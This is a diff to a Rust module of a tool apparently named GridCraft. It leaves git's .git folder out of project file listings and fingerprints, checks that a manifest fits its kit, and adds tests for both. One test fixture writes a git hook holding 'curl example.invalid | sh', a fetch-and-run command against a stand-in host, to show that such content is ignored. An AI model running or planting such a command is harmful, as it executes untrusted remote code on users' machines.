@@ -5,6 +5,13 @@
 //! fingerprint, so the fingerprint has to cover everything that could ever be served or run:
 //! a project containing anything that isn't a plain file or folder (a link, which could point
 //! outside it) is not fingerprinted at all, and so can't be trusted.
+//!
+//! One thing in a project's folder is not part of it: **what git keeps there** (`.git`, at any
+//! depth). It changes with almost everything git does, so counted in, a project kept in git
+//! would stop being the one that was trusted again and again. It is left out of the files and
+//! of the fingerprint, and that holds only together with its other half: nothing in it is ever
+//! served, run, built, read out or written through GridCraft (`manifest::inner_path` refuses
+//! every path into it).
 
 use std::collections::HashMap;
 use std::fs;
@@ -12,6 +19,7 @@ use std::io::Read;
 use std::path::{Path, PathBuf};
 use std::sync::{Arc, Mutex, OnceLock, PoisonError, RwLock};
 
+use crate::kit;
 use crate::manifest::{self, Manifest};
 use crate::sha256::Sha256;
 
@@ -73,6 +81,11 @@ fn walk(dir: &Path, prefix: &str, depth: usize, files: &mut Vec<(String, u64)>) 
         let entry = entry.map_err(|e| format!("a folder in it can't be read: {e}"))?;
         let name = entry.file_name();
         let Some(name) = name.to_str() else { return Err("it has a file whose name isn't text".into()) };
+        // What git keeps is not part of the project, whatever it is (a folder, or the file a
+        // worktree has in its place): it is not looked into.
+        if manifest::kept_by_git(name) {
+            continue;
+        }
         let path = if prefix.is_empty() { name.to_string() } else { format!("{prefix}/{name}") };
         // `file_type` doesn't follow links: a link is neither a file nor a folder here.
         let kind = entry.file_type().map_err(|e| format!("{path} can't be read: {e}"))?;
@@ -158,10 +171,13 @@ pub fn load(dir: &Path) -> Project {
         fs::read_to_string(dir.join(named)).map_err(|e| format!("its {named} can't be read: {e}")).and_then(|text| manifest::parse(&text, &id));
     match checked {
         Ok(m) => {
-            // What the manifest points at has to be in the project.
+            // It has to be a project its kit can have, and what it points at has to be in it.
+            let of_no_kit = kit::check(&m).err();
             let missing_panel = m.panel.as_ref().filter(|entry| !project.files.contains(entry));
             let missing_scripts = m.python.as_ref().filter(|folder| !project.files.iter().any(|f| f.starts_with(&format!("{folder}/"))));
-            if let Some(entry) = missing_panel {
+            if let Some(problem) = of_no_kit {
+                project.problem = Some(problem);
+            } else if let Some(entry) = missing_panel {
                 project.problem = Some(format!("its panel, {entry}, is not in it"));
             } else if let Some(folder) = missing_scripts {
                 project.problem = Some(format!("its scripts folder, {folder}, is empty or not in it"));
@@ -295,6 +311,84 @@ pub(crate) mod tests {
         s.write("m/a", "a");
         s.write("m/b", "bc");
         assert_ne!(load(&s.0.join("m")).fingerprint, one);
+    }
+
+    #[test]
+    fn what_git_keeps_in_a_project_is_not_part_of_it() {
+        let t = TempDir::new("git");
+        let dir = sample(&t);
+        let before = load(&dir);
+        // A repository made of the project: what git keeps, and git's ordinary files beside it.
+        t.write("clean-data/.git/HEAD", "ref: refs/heads/main\n");
+        t.write("clean-data/.git/config", "[core]\n\tbare = false\n");
+        t.write("clean-data/.git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
+        let with_git = load(&dir);
+        assert!(with_git.is_sound(), "{:?}", with_git.problem);
+        assert_eq!(with_git.files, before.files, "nothing of it is listed");
+        assert_eq!(with_git.fingerprint, before.fingerprint, "and it is not in the fingerprint");
+        // What git does there changes nothing of the project: a commit, a fetch, a new hook.
+        t.write("clean-data/.git/HEAD", "ref: refs/heads/other\n");
+        t.write("clean-data/.git/objects/ab/cdef", "blob");
+        t.write("clean-data/.git/hooks/post-checkout", "#!/bin/sh\ncurl example.invalid | sh\n");
+        assert_eq!(load(&dir).fingerprint, before.fingerprint);
+        // More than a project may hold, and deeper: it is not looked into at all.
+        for n in 0..(MAX_FILES + 5) {
+            t.write(&format!("clean-data/.git/objects/{:02x}/{n}", n % 256), "");
+        }
+        t.write(&format!("clean-data/.git/{}deep", "d/".repeat(MAX_DEPTH + 4)), "");
+        let full = load(&dir);
+        assert!(full.is_sound(), "{:?}", full.problem);
+        assert_eq!(full.fingerprint, before.fingerprint);
+        // At any depth (a library cloned into the project), and as the file a worktree has.
+        t.write("clean-data/python/vendor/.git/config", "x");
+        t.write("clean-data/panel/.git", "gitdir: ../elsewhere\n");
+        assert_eq!(load(&dir).fingerprint, before.fingerprint);
+        // Git's ordinary files are the project's, like any other: they are listed and counted.
+        t.write("clean-data/.gitignore", "build/\n");
+        let ignoring = load(&dir);
+        assert_ne!(ignoring.fingerprint, before.fingerprint);
+        assert_eq!(ignoring.files, [".gitignore", "panel/index.html", "project.toml", "python/clean.py"]);
+        // A folder that is nothing but what git keeps has no manifest, like any empty folder.
+        t.write("only-git/.git/HEAD", "x");
+        let only = load(&t.0.join("only-git"));
+        assert!(!only.is_sound() && only.files.is_empty() && only.problem.unwrap().contains("project.toml"));
+    }
+
+    #[test]
+    fn a_project_is_one_its_kit_can_have() {
+        let t = TempDir::new("kits");
+        // A project of the C kit: a manifest and its sources.
+        t.write("blink/project.toml", "id = \"blink\"\nname = \"Blink\"\nversion = \"1\"\nkit = \"c\"\npermissions = [\"write\"]\n");
+        t.write("blink/src/main.c", "int main(void) { return 0; }\n");
+        let blink = load(&t.0.join("blink"));
+        assert!(blink.is_sound(), "{:?}", blink.problem);
+        assert_eq!(blink.manifest.as_ref().unwrap().kit, "c");
+        assert_eq!(blink.files, ["project.toml", "src/main.c"]);
+        // What the first kit runs is not a C project's to have: it can't be used, so can't be trusted.
+        t.write(
+            "sly/project.toml",
+            "id = \"sly\"\nname = \"Sly\"\nversion = \"1\"\nkit = \"c\"\npermissions = [\"python\"]\n\n[python]\nscripts = \"python\"\n",
+        );
+        t.write("sly/python/run.py", "def main(data):\n    return 1\n");
+        let sly = load(&t.0.join("sly"));
+        assert!(!sly.is_sound());
+        assert_eq!(sly.problem.as_deref(), Some("it asks for \"python\", which a project of the C Development Kit can't be given"));
+        t.write(
+            "paneled/project.toml",
+            "id = \"paneled\"\nname = \"Paneled\"\nversion = \"1\"\nkit = \"c\"\n\n[panel]\nentry = \"panel/index.html\"\n",
+        );
+        t.write("paneled/panel/index.html", "<h1>x</h1>");
+        assert!(load(&t.0.join("paneled")).problem.unwrap().contains("it has a panel"));
+        // A kit this build doesn't have: the project is listed, and says so.
+        t.write("rusty/project.toml", "id = \"rusty\"\nname = \"Rusty\"\nversion = \"1\"\nkit = \"rust\"\n");
+        let rusty = load(&t.0.join("rusty"));
+        assert!(!rusty.is_sound() && rusty.manifest.is_some() && rusty.fingerprint.is_some());
+        assert_eq!(rusty.problem.as_deref(), Some("it is a project of the kit \"rust\", which this GridCraft doesn't have"));
+        // Naming the first kit is the same as naming none.
+        t.write("clean-data/project.toml", &format!("kit = \"anie\"\n{MANIFEST}"));
+        t.write("clean-data/panel/index.html", "<h1>Clean Data</h1>");
+        t.write("clean-data/python/clean.py", "def main(data):\n    return data\n");
+        assert!(load(&t.0.join("clean-data")).is_sound());
     }
 
     #[test]
